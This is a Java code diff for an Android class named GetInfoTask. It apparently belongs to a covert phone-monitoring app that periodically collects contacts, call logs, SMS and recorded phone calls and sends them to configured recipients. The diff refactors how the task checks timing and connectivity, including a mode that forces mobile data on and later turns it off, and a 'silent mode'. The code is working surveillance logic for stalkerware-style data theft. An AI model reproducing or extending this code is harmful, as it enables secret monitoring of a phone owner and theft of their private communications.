@@ -68,33 +68,23 @@ public class GetInfoTask extends TimerTask
 		String[] recipients = getRecipients(context);
 		if (recipients == null || recipients.length == 0) return;
 		
-		// If network connected, try to collect and send the information
-		boolean activateDataNetwork = false;
-		if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
-			activateDataNetwork = NetworkUtil.tryToConnectDataNetwork(context);
-		} 
-		
-		if (!NetworkUtil.isNetworkConnected(context)) return;
+		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
 		
 		// ===================================================================================
 		// Try to send contact/phonecall/SMS collections
 		// ===================================================================================
-		
-		// Firstly we should make sure the time range ( > days that user set)
-		Date lastDatetime = null;
-		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
-		if (lastDatetimeStr != null && lastDatetimeStr.length() > 0) {
-			try {
-				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
-			} catch (Exception ex) {}
-		}
-			
-		Calendar now = Calendar.getInstance();
-		if (interval < 1) interval = 1;
-		now.add(Calendar.DATE, -1*interval);
-		Date now_minus_x_day = now.getTime();
-		if (lastDatetime == null || now_minus_x_day.after(lastDatetime)) 
+		if (isTimeToCollectInfo()) 
 		{
+			// If network connected, try to collect and send the information
+			boolean isDataNetworkConnected = false;
+			if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
+				isDataNetworkConnected = NetworkUtil.tryToConnectDataNetwork(context);
+			} else { // Silent mode
+				isDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
+			}
+			
+			if (!isDataNetworkConnected) return;
+			
 			// Clean attachments
 			if (attachments == null) attachments = new ArrayList<File>();
 			else attachments.clear();
@@ -133,8 +123,7 @@ public class GetInfoTask extends TimerTask
 				
 			// Update the last date time
 			if (result) {
-				boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
-				if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
+				ConfigCtrl.setLastGetInfoTime(context, new Date());
 			}
 			
 			// Clean the files in SD-CARD
@@ -145,9 +134,14 @@ public class GetInfoTask extends TimerTask
 		// Try to send phone call recording
 		// ===================================================================================
 		SysUtils.threadSleep(1000, LOGTAG);
-		if (!NetworkUtil.isNetworkConnected(context)) {
-			return;
+		// If network connected, try to collect and send the information
+		boolean isDataNetworkConnected = false;
+		if (GlobalPrefActivity.getNetworkConnectMode(context) == NETWORK_CONNECT_MODE.ACTIVE) {
+			isDataNetworkConnected = NetworkUtil.tryToConnectDataNetwork(context);
+		} else { // Silent mode
+			isDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
 		}
+		if (!isDataNetworkConnected) return;
 		
 		// Get all wav files
 		String prefix = context.getResources().getString(R.string.phonecall_record);
@@ -206,11 +200,29 @@ public class GetInfoTask extends TimerTask
 			}
 		}
 		
-		if (activateDataNetwork) {
+		// If data network is connected by active mode, try to disconnect it
+		if (!isAlreadyDataNetworkConnected) {
 			NetworkUtil.tryToDisconnectDataNetwork(context);
 		}
 		
 	} // end of run()
+	
+	// Make sure the time range ( > days that user set)
+	private boolean isTimeToCollectInfo() {
+		Date lastDatetime = null;
+		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
+		if (lastDatetimeStr != null && lastDatetimeStr.length() > 0) {
+			try {
+				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
+			} catch (Exception ex) {}
+		}
+			
+		Calendar now = Calendar.getInstance();
+		if (interval < 1) interval = 1;
+		now.add(Calendar.DATE, -1*interval);
+		Date now_minus_x_day = now.getTime();
+		return (lastDatetime == null || now_minus_x_day.after(lastDatetime)); 
+	}
 	
 	// Get i*count ~ (i+1)*count members in wavs as one package
 	private List<File> getPackage(List<File> wavs, final int count, final int i) 
